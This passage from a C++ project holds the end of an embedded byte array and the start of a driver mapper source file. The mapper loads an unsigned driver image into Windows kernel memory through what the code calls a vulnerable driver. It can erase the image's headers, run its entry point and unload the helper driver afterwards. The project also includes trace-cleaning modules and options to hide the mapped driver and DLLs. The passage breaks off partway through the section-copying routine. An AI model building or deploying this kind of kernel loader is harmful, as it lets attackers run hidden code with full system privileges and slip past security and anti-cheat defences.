    0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x4A, 0x61, 0x63,
    0x67, 0x4E, 0x4A, 0x4A, 0x6B, 0x6D, 0x4A, 0x4A, 0x45, 0x6D, 0x4A, 0x4A, 0x44, 0x45, 0x4A, 0x4A,
    0x00, 0x00, 0x00, 0x02, 0x0D, 0x06, 0x06, 0x06, 0x06, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x06, 0x06,
    0x06, 0x00, 0x06, 0x06, 0x02, 0x06, 0x00, 0x0A, 0x0A, 0x07, 0x07, 0x06, 0x02, 0x05, 0x05, 0x02,
    0x02, 0x00, 0x00, 0x04, 0x04, 0x04, 0x04, 0x00, 0x00, 0x00, 0x0E, 0x05, 0x06, 0x06, 0x06, 0x01,
    0x06, 0x00, 0x00, 0x08, 0x00, 0x10, 0x00, 0x18, 0x00, 0x20, 0x00, 0x28, 0x00, 0x30, 0x00, 0x80,
    0x01, 0x82, 0x01, 0x86, 0x00, 0xF6, 0xCF, 0xFE, 0x3F, 0xAB, 0x00, 0xB0, 0x00, 0xB1, 0x00, 0xB3,
    0x00, 0xBA, 0xF8, 0xBB, 0x00, 0xC0, 0x00, 0xC1, 0x00, 0xC7, 0xBF, 0x62, 0xFF, 0x00, 0x8D, 0xFF,
    0x00, 0xC4, 0xFF, 0x00, 0xC5, 0xFF, 0x00, 0xFF, 0xFF, 0xEB, 0x01, 0xFF, 0x0E, 0x12, 0x08, 0x00,
    0x13, 0x09, 0x00, 0x16, 0x08, 0x00, 0x17, 0x09, 0x00, 0x2B, 0x09, 0x00, 0xAE, 0xFF, 0x07, 0xB2,
    0xFF, 0x00, 0xB4, 0xFF, 0x00, 0xB5, 0xFF, 0x00, 0xC3, 0x01, 0x00, 0xC7, 0xFF, 0xBF, 0xE7, 0x08,
    0x00, 0xF0, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xA5, 0xAA, 0xA5, 0xB8, 0xA5, 0xAA, 0xA5, 0xAA, 0xA5, 0xB8, 0xA5, 0xB8, 0xA5, 0xB8, 0xA5, 0xB8,
    0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xC0, 0xAC, 0xC0, 0xCC, 0xC0, 0xA1, 0xA1, 0xA1, 0xA1,
    0xB1, 0xA5, 0xA5, 0xA6, 0xC0, 0xC0, 0xD7, 0xDA, 0xE0, 0xC0, 0xE4, 0xC0, 0xEA, 0xEA, 0xE0, 0xE0,
    0x98, 0xC8, 0xEE, 0xF1, 0xA5, 0xD3, 0xA5, 0xA5, 0xA1, 0xEA, 0x9E, 0xC0, 0xC0, 0xC2, 0xC0, 0xE6,
    0x03, 0x7F, 0x11, 0x7F, 0x01, 0x7F, 0x01, 0x3F, 0x01, 0x01, 0xAB, 0x8B, 0x90, 0x64, 0x5B, 0x5B,
    0x5B, 0x5B, 0x5B, 0x92, 0x5B, 0x5B, 0x76, 0x90, 0x92, 0x92, 0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x5B,
    0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x6A, 0x73, 0x90, 0x5B, 0x52, 0x52, 0x52, 0x52, 0x5B, 0x5B,
    0x5B, 0x5B, 0x77, 0x7C, 0x77, 0x85, 0x5B, 0x5B, 0x70, 0x5B, 0x7A, 0xAF, 0x76, 0x76, 0x5B, 0x5B,
    0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x5B, 0x86, 0x01, 0x03, 0x01, 0x04, 0x03, 0xD5,
    0x03, 0xD5, 0x03, 0xCC, 0x01, 0xBC, 0x03, 0xF0, 0x03, 0x03, 0x04, 0x00, 0x50, 0x50, 0x50, 0x50,
    0xFF, 0x20, 0x20, 0x20, 0x20, 0x01, 0x01, 0x01, 0x01, 0xC4, 0x02, 0x10, 0xFF, 0xFF, 0xFF, 0x01,
    0x00, 0x03, 0x11, 0xFF, 0x03, 0xC4, 0xC6, 0xC8, 0x02, 0x10, 0x00, 0xFF, 0xCC, 0x01, 0x01, 0x01,
    0x00, 0x00, 0x00, 0x00, 0x01, 0x01, 0x03, 0x01, 0xFF, 0xFF, 0xC0, 0xC2, 0x10, 0x11, 0x02, 0x03,
    0x01, 0x01, 0x01, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0xFF, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,
    0x10, 0x10, 0x10, 0x10, 0x02, 0x10, 0x00, 0x00, 0xC6, 0xC8, 0x02, 0x02, 0x02, 0x02, 0x06, 0x00,
    0x04, 0x00, 0x02, 0xFF, 0x00, 0xC0, 0xC2, 0x01, 0x01, 0x03, 0x03, 0x03, 0xCA, 0x40, 0x00, 0x0A,
    0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x33, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xFF, 0xBF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0xFF, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0xBF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7F, 0x00, 0x00, 0xFF, 0x40, 0x40, 0x40, 0x40,
    0x41, 0x49, 0x40, 0x40, 0x40, 0x40, 0x4C, 0x42, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40,
    0x4F, 0x44, 0x53, 0x40, 0x40, 0x40, 0x44, 0x57, 0x43, 0x5C, 0x40, 0x60, 0x40, 0x40, 0x40, 0x40,
    0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x40, 0x64, 0x66, 0x6E, 0x6B, 0x40, 0x40,
    0x6A, 0x46, 0x40, 0x40, 0x44, 0x46, 0x40, 0x40, 0x5B, 0x44, 0x40, 0x40, 0x00, 0x00, 0x00, 0x00,
    0x06, 0x06, 0x06, 0x06, 0x01, 0x06, 0x06, 0x02, 0x06, 0x06, 0x00, 0x06, 0x00, 0x0A, 0x0A, 0x00,
    0x00, 0x00, 0x02, 0x07, 0x07, 0x06, 0x02, 0x0D, 0x06, 0x06, 0x06, 0x0E, 0x05, 0x05, 0x02, 0x02,
    0x00, 0x00, 0x04, 0x04, 0x04, 0x04, 0x05, 0x06, 0x06, 0x06, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00,
    0x08, 0x00, 0x10, 0x00, 0x18, 0x00, 0x20, 0x00, 0x28, 0x00, 0x30, 0x00, 0x80, 0x01, 0x82, 0x01,
    0x86, 0x00, 0xF6, 0xCF, 0xFE, 0x3F, 0xAB, 0x00, 0xB0, 0x00, 0xB1, 0x00, 0xB3, 0x00, 0xBA, 0xF8,
    0xBB, 0x00, 0xC0, 0x00, 0xC1, 0x00, 0xC7, 0xBF, 0x62, 0xFF, 0x00, 0x8D, 0xFF, 0x00, 0xC4, 0xFF,
    0x00, 0xC5, 0xFF, 0x00, 0xFF, 0xFF, 0xEB, 0x01, 0xFF, 0x0E, 0x12, 0x08, 0x00, 0x13, 0x09, 0x00,
    0x16, 0x08, 0x00, 0x17, 0x09, 0x00, 0x2B, 0x09, 0x00, 0xAE, 0xFF, 0x07, 0xB2, 0xFF, 0x00, 0xB4,
    0xFF, 0x00, 0xB5, 0xFF, 0x00, 0xC3, 0x01, 0x00, 0xC7, 0xFF, 0xBF, 0xE7, 0x08, 0x00, 0xF0, 0x02,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x10, 0x00, 0x00, 0x0B, 0x12, 0x00, 0x00, 0xD8, 0xDC, 0x00, 0x00, 0x10, 0x12, 0x00, 0x00,
    0x89, 0x13, 0x00, 0x00, 0xE4, 0xDC, 0x00, 0x00, 0x90, 0x13, 0x00, 0x00, 0x95, 0x14, 0x00, 0x00,
    0xFC, 0xDC, 0x00, 0x00, 0xA0, 0x14, 0x00, 0x00, 0x43, 0x1C, 0x00, 0x00, 0x04, 0xDD, 0x00, 0x00,
    0x50, 0x1C, 0x00, 0x00, 0x7D, 0x1F, 0x00, 0x00, 0x10, 0xDD, 0x00, 0x00, 0x80, 0x1F, 0x00, 0x00,
    0xD6, 0x20, 0x00, 0x00, 0x28, 0xDD, 0x00, 0x00, 0xE0, 0x20, 0x00, 0x00, 0x3C, 0x22, 0x00, 0x00,
    0x38, 0xDD, 0x00, 0x00, 0x40, 0x22, 0x00, 0x00, 0x70, 0x23, 0x00, 0x00, 0x44, 0xDD, 0x00, 0x00,
    0x70, 0x23, 0x00, 0x00, 0x16, 0x25, 0x00, 0x00, 0x58, 0xDD, 0x00, 0x00, 0x20, 0x25, 0x00, 0x00,
    0x91, 0x25, 0x00, 0x00, 0x68, 0xDD, 0x00, 0x00, 0xA0, 0x25, 0x00, 0x00, 0xF0, 0x26, 0x00, 0x00,
    0x70, 0xDD, 0x00, 0x00, 0xF0, 0x26, 0x00, 0x00, 0x3A, 0x28, 0x00, 0x00, 0x70, 0xDD, 0x00, 0x00,
    0x40, 0x28, 0x00, 0x00, 0xD2, 0x28, 0x00, 0x00, 0x80, 0xDD, 0x00, 0x00, 0xE0, 0x28, 0x00, 0x00,
    0x54, 0x29, 0x00, 0x00, 0xFC, 0xDC, 0x00, 0x00, 0x60, 0x29, 0x00, 0x00, 0xCC, 0x29, 0x00, 0x00,
    0xFC, 0xDC, 0x00, 0x00, 0xD0, 0x29, 0x00, 0x00, 0x53, 0x2B, 0x00, 0x00, 0x88, 0xDD, 0x00, 0x00,
    0x60, 0x2B, 0x00, 0x00, 0x80, 0x33, 0x00, 0x00, 0x90, 0xDD, 0x00, 0x00, 0x80, 0x33, 0x00, 0x00,
    0x45, 0x34, 0x00, 0x00, 0xFC, 0xDC, 0x00, 0x00, 0x50, 0x34, 0x00, 0x00, 0x9A, 0x37, 0x00, 0x00,
    0xAC, 0xDD, 0x00, 0x00, 0xA0, 0x37, 0x00, 0x00, 0x55, 0x38, 0x00, 0x00, 0xD8, 0xDC, 0x00, 0x00,
    0x60, 0x38, 0x00, 0x00, 0xB9, 0x38, 0x00, 0x00, 0xFC, 0xDC, 0x00, 0x00, 0xC0, 0x38, 0x00, 0x00,
    0xC1, 0x3F, 0x00, 0x00, 0xC8, 0xDD, 0x00, 0x00, 0xD0, 0x3F, 0x00, 0x00, 0x5B, 0x40, 0x00, 0x00,
    0xE0, 0xDD, 0x00, 0x00, 0x60, 0x40, 0x00, 0x00, 0x41, 0x41, 0x00, 0x00, 0x38, 0xDD, 0x00, 0x00,
    0x50, 0x41, 0x00, 0x00, 0x46, 0x44, 0x00, 0x00, 0xE4, 0xDC, 0x00, 0x00, 0x50, 0x44, 0x00, 0x00,
    0x89, 0x46, 0x00, 0x00, 0xEC, 0xDD, 0x00, 0x00, 0x90, 0x46, 0x00, 0x00, 0x29, 0x4A, 0x00, 0x00,
    0xFC, 0xDD, 0x00, 0x00, 0x30, 0x4A, 0x00, 0x00, 0xFB, 0x4A, 0x00, 0x00, 0xE0, 0xDD, 0x00, 0x00,
    0x00, 0x4B, 0x00, 0x00, 0x2F, 0x4D, 0x00, 0x00, 0x14, 0xDE, 0x00, 0x00, 0x30, 0x4D, 0x00, 0x00,
    0xC5, 0x4D, 0x00, 0x00, 0xFC, 0xDC, 0x00, 0x00, 0xD0, 0x4D, 0x00, 0x00, 0x72, 0x50, 0x00, 0x00,
    0xE4, 0xDC, 0x00, 0x00, 0x80, 0x50, 0x00, 0x00, 0x4E, 0x53, 0x00, 0x00, 0xD8, 0xDC, 0x00, 0x00,
    0x50, 0x53, 0x00, 0x00, 0x53, 0x55, 0x00, 0x00, 0x20, 0xDE, 0x00, 0x00, 0x60, 0x55, 0x00, 0x00,
    0x97, 0x56, 0x00, 0x00, 0x34, 0xDE, 0x00, 0x00, 0xA0, 0x56, 0x00, 0x00, 0xF1, 0x57, 0x00, 0x00,
    0x44, 0xDE, 0x00, 0x00, 0x00, 0x58, 0x00, 0x00, 0xF0, 0x58, 0x00, 0x00, 0x58, 0xDE, 0x00, 0x00,
    0xF0, 0x58, 0x00, 0x00, 0x2D, 0x5B, 0x00, 0x00, 0x38, 0xDD, 0x00, 0x00, 0x30, 0x5B, 0x00, 0x00,
    0x26, 0x5D, 0x00, 0x00, 0x60, 0xDE, 0x00, 0x00, 0x30, 0x5D, 0x00, 0x00, 0xBA, 0x5E, 0x00, 0x00,
    0x04, 0xDD, 0x00, 0x00, 0xC0, 0x5E, 0x00, 0x00, 0x1C, 0x5F, 0x00, 0x00, 0xD8, 0xDC, 0x00, 0x00,
    0x50, 0x5F, 0x00, 0x00, 0x20, 0x61, 0x00, 0x00, 0x74, 0xDE, 0x00, 0x00, 0x20, 0x61, 0x00, 0x00,
    0xC3, 0x61, 0x00, 0x00, 0xE0, 0xDD, 0x00, 0x00, 0xD0, 0x61, 0x00, 0x00, 0xCD, 0x62, 0x00, 0x00,
    0x38, 0xDD, 0x00, 0x00, 0xD0, 0x62, 0x00, 0x00, 0x4A, 0x6B, 0x00, 0x00, 0x88, 0xDE, 0x00, 0x00,
    0x50, 0x6B, 0x00, 0x00, 0xB5, 0x71, 0x00, 0x00, 0xA0, 0xDE, 0x00, 0x00, 0xC0, 0x71, 0x00, 0x00,
    0x22, 0x75, 0x00, 0x00, 0xB8, 0xDE, 0x00, 0x00, 0x30, 0x75, 0x00, 0x00, 0x21, 0x78, 0x00, 0x00,
    0xD0, 0xDE, 0x00, 0x00, 0x30, 0x78, 0x00, 0x00, 0x50, 0x78, 0x00, 0x00, 0xFC, 0xDC, 0x00, 0x00,
    0x50, 0x78, 0x00, 0x00, 0x85, 0x78, 0x00, 0x00, 0x58, 0xDE, 0x00, 0x00, 0x90, 0x78, 0x00, 0x00,
    0xCD, 0x78, 0x00, 0x00, 0x58, 0xDE, 0x00, 0x00, 0xD0, 0x78, 0x00, 0x00, 0x4F, 0x7A, 0x00, 0x00,
    0xB8, 0xDE, 0x00, 0x00, 0x50, 0x7A, 0x00, 0x00, 0xD4, 0x7A, 0x00, 0x00, 0xE4, 0xDE, 0x00, 0x00,
    0xE0, 0x7A, 0x00, 0x00, 0xF6, 0x7D, 0x00, 0x00, 0xE4, 0xDC, 0x00, 0x00, 0x00, 0x7E, 0x00, 0x00,
    0xDA, 0x7F, 0x00, 0x00, 0xE4, 0xDC, 0x00, 0x00, 0x20, 0x80, 0x00, 0x00, 0x7F, 0x80, 0x00, 0x00,
    0xE0, 0xDD, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00, 0x7D, 0x81, 0x00, 0x00, 0xE0, 0xDD, 0x00, 0x00,
    0x80, 0x81, 0x00, 0x00, 0xA6, 0x82, 0x00, 0x00, 0xF8, 0xDE, 0x00, 0x00, 0xB0, 0x82, 0x00, 0x00,
    0xD6, 0x83, 0x00, 0x00, 0xF8, 0xDE, 0x00, 0x00, 0xE0, 0x83, 0x00, 0x00, 0x2D, 0x85, 0x00, 0x00,
    0xD8, 0xDC, 0x00, 0x00, 0x50, 0x85, 0x00, 0x00, 0x03, 0x87, 0x00, 0x00, 0x0C, 0xDF, 0x00, 0x00,
    0x10, 0x87, 0x00, 0x00, 0xC3, 0x88, 0x00, 0x00, 0x0C, 0xDF, 0x00, 0x00, 0xD0, 0x88, 0x00, 0x00,
    0x68, 0x89, 0x00, 0x00, 0xE4, 0xDE, 0x00, 0x00, 0x70, 0x89, 0x00, 0x00, 0xA6, 0x89, 0x00, 0x00,
    0x58, 0xDE, 0x00, 0x00, 0xB0, 0x89, 0x00, 0x00, 0x02, 0x8B, 0x00, 0x00, 0xD8, 0xDC, 0x00, 0x00,
    0x10, 0x8B, 0x00, 0x00, 0xF2, 0x8D, 0x00, 0x00, 0x24, 0xDF, 0x00, 0x00, 0x00, 0x8E, 0x00, 0x00,
    0x4A, 0x8E, 0x00, 0x00, 0xFC, 0xDC, 0x00, 0x00, 0x50, 0x8E, 0x00, 0x00, 0x9E, 0x8E, 0x00, 0x00,
    0xFC, 0xDC, 0x00, 0x00, 0xA0, 0x8E, 0x00, 0x00, 0xBD, 0x8E, 0x00, 0x00, 0xFC, 0xDC, 0x00, 0x00,
    0xC0, 0x8E, 0x00, 0x00, 0x3B, 0x8F, 0x00, 0x00, 0x14, 0xDE, 0x00, 0x00, 0x40, 0x8F, 0x00, 0x00,
    0xB1, 0x8F, 0x00, 0x00, 0x38, 0xDD, 0x00, 0x00, 0xD0, 0x8F, 0x00, 0x00, 0x21, 0x90, 0x00, 0x00,
    0x3C, 0xDF, 0x00, 0x00, 0x40, 0x90, 0x00, 0x00, 0x78, 0x90, 0x00, 0x00, 0x44, 0xDF, 0x00, 0x00,
    0x80, 0x90, 0x00, 0x00, 0xA0, 0x93, 0x00, 0x00, 0xAC, 0xDD, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

```

`client/driver_mapper/driver_mapper.cpp`:

```cpp
#include "driver_mapper.hpp"
#include "memory_manager.hpp"
#include "service_manager.hpp"
#include "trace_cleaner.hpp"
#include "page_table_manager.hpp"
#include "pe_parser.hpp"
#include "utils.hpp"
#include <iostream>
#include <fstream>
#include "pdb/pdb.hpp"

// forward declarations for external NT functions
extern "C" {
NTSTATUS NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                  PVOID SystemInformation, ULONG SystemInformationLength,
                                  PULONG ReturnLength);
NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
                                 PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
                             ULONG FreeType);
NTSTATUS NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
                                 PTOKEN_PRIVILEGES NewState, ULONG BufferLength,
                                 PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
NTSTATUS NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
NTSTATUS NtClose(HANDLE Handle);
}

// RAII wrapper for local image allocation
class local_image_ptr {
  void* ptr_ = nullptr;
  SIZE_T size_ = 0;

public:
  explicit local_image_ptr(SIZE_T size) : size_(size) {
    auto status = NtAllocateVirtualMemory(GetCurrentProcess(), &ptr_, 0, &size_,
                                          MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
      ptr_ = nullptr;
  }

  ~local_image_ptr() {
    if (ptr_) {
      SIZE_T free_size = 0;
      NtFreeVirtualMemory(GetCurrentProcess(), &ptr_, &free_size, MEM_RELEASE);
    }
  }

  local_image_ptr(const local_image_ptr&) = delete;
  local_image_ptr& operator=(const local_image_ptr&) = delete;

  void* get() const {
    return ptr_;
  }
  operator bool() const {
    return ptr_ != nullptr;
  }
};

auto driver_mapper_t::map_driver(std::vector<std::uint8_t>& driver_data, std::uint64_t param1,
                                 std::uint64_t param2, bool free_after_exec, bool destroy_headers,
                                 bool pass_alloc_address_as_first_param, NTSTATUS* exit_code,
                                 settings::driver_alloc_mode alloc_mode,
                                 settings::memory_type mem_type, settings::hide_type driver_hide,
                                 settings::hide_type dll_hide,
                                 settings::experimental_options experimental_options)
    -> std::uint64_t {
  mapper_log("INFO", "starting driver mapping process...");

  // initialize if needed
  if (!initialized_ && !initialize()) {
    mapper_log("ERROR", "failed to initialize driver mapper");
    return 0;
  }

  // validate PE image
  auto nt_headers = g_pe_parser->get_nt_headers(driver_data.data());
  if (!nt_headers || nt_headers->OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC) {
    mapper_log("ERROR", "invalid PE image or not 64-bit");
    cleanup();
    return 0;
  }

  auto image_size = nt_headers->OptionalHeader.SizeOfImage;
  auto header_size = IMAGE_FIRST_SECTION(nt_headers)->VirtualAddress;
  auto final_size = destroy_headers ? (image_size - header_size) : image_size;

  mapper_log("SUCCESS", "PE validated - size: 0x%x, header: 0x%x", image_size, header_size);

  // allocate local buffer
  local_image_ptr local_image(image_size);
  if (!local_image.get()) {
    mapper_log("ERROR", "failed to allocate local memory");
    cleanup();
    return 0;
  }

  // prepare image locally
  if (!prepare_local_image(local_image.get(), driver_data, nt_headers)) {
    mapper_log("ERROR", "failed to prepare local image");
    cleanup();
    return 0;
  }

  // allocate kernel memory
  auto kernel_base = allocate_driver_memory(final_size, alloc_mode, mem_type, destroy_headers);
  if (!kernel_base) {
    mapper_log("ERROR", "failed to allocate kernel memory");
    cleanup();
    return 0;
  }

  mapper_log("SUCCESS", "allocated kernel memory at: 0x%llx", kernel_base);

  // calculate addresses
  auto write_addr = kernel_base;
  auto entry_base = destroy_headers ? (kernel_base - header_size) : kernel_base;
  auto entry_point = entry_base + nt_headers->OptionalHeader.AddressOfEntryPoint;

  // write to kernel
  auto source = destroy_headers ? (reinterpret_cast<std::uint8_t*>(local_image.get()) + header_size)
                                : local_image.get();

  if (!g_memory_manager->write_memory(device_handle_, write_addr, source, final_size)) {
    mapper_log("ERROR", "failed to write image to kernel");
    cleanup();
    return 0;
  }

  // store mapping info
  offsets_.DriverAllocBase = entry_base;
  offsets_.DriverSize = final_size;
  offsets_.DriverHideType = static_cast<std::uint32_t>(driver_hide);
  offsets_.DllHideType = static_cast<std::uint32_t>(dll_hide);
  offsets_.ExperimentalOptions = static_cast<std::uint32_t>(experimental_options);

  // call driver entry
  mapper_log("SUCCESS", "calling driver entry at: 0x%llx", entry_point);
  auto driver_status = call_driver_entry(
      entry_point, pass_alloc_address_as_first_param ? write_addr : param1, param2, false, 0);

  if (exit_code)
    *exit_code = driver_status;
  mapper_log("SUCCESS", "driver entry returned: 0x%lx", driver_status);

  // cleanup if requested
  if (free_after_exec) {
    mapper_log("SUCCESS", "freeing kernel memory");
    // TODO: Implement proper memory freeing based on alloc_mode
  }

  // final cleanup
  if (!g_service_manager->unload_vulnerable_driver(device_handle_)) {
    mapper_log("ERROR", "failed to unload vulnerable driver");
    return 0;
  }

  mapper_log("SUCCESS", "driver mapping completed successfully");
  return write_addr;
}

// helper function to prepare local image for manual mapping
auto driver_mapper_t::prepare_local_image(void* local_image,
                                          const std::vector<std::uint8_t>& driver_data,
                                          PIMAGE_NT_HEADERS64 nt_headers) -> bool {
  // zero memory
  std::memset(local_image, 0, nt_headers->OptionalHeader.SizeOfImage);

  // copy sections
  if (!copy_pe_sections(local_image, driver_data)) {
    mapper_log("ERROR", "failed to copy PE sections");
    return false;
  }

  // process relocations
  auto entry_base = reinterpret_cast<std::uint64_t>(local_image);
  if (!relocate_image(local_image, entry_base, nt_headers->OptionalHeader.ImageBase)) {
    mapper_log("ERROR", "failed to process relocations");
    return false;
  }

  // fix security cookie
  if (!fix_security_cookie(local_image, entry_base)) {
    mapper_log("ERROR", "failed to fix security cookie");
    return false;
  }

  // resolve imports
  if (!resolve_imports(local_image)) {
    mapper_log("ERROR", "failed to resolve imports");
    return false;
  }

  return true;
}

// pe section copying function
auto driver_mapper_t::copy_pe_sections(void* local_image,
                                       const std::vector<std::uint8_t>& driver_data) -> bool {
  auto nt_headers = g_pe_parser->get_nt_headers(const_cast<std::uint8_t*>(driver_data.data()));
  if (!nt_headers) {
    mapper_log("ERROR", "failed to get NT headers during section copy");
    return false;
  }

  // copy headers first
  std::memcpy(local_image, driver_data.data(), nt_headers->OptionalHeader.SizeOfHeaders);

  mapper_log("SUCCESS", "copied PE headers (0x%lx bytes)",
             nt_headers->OptionalHeader.SizeOfHeaders);

  // copy each section properly
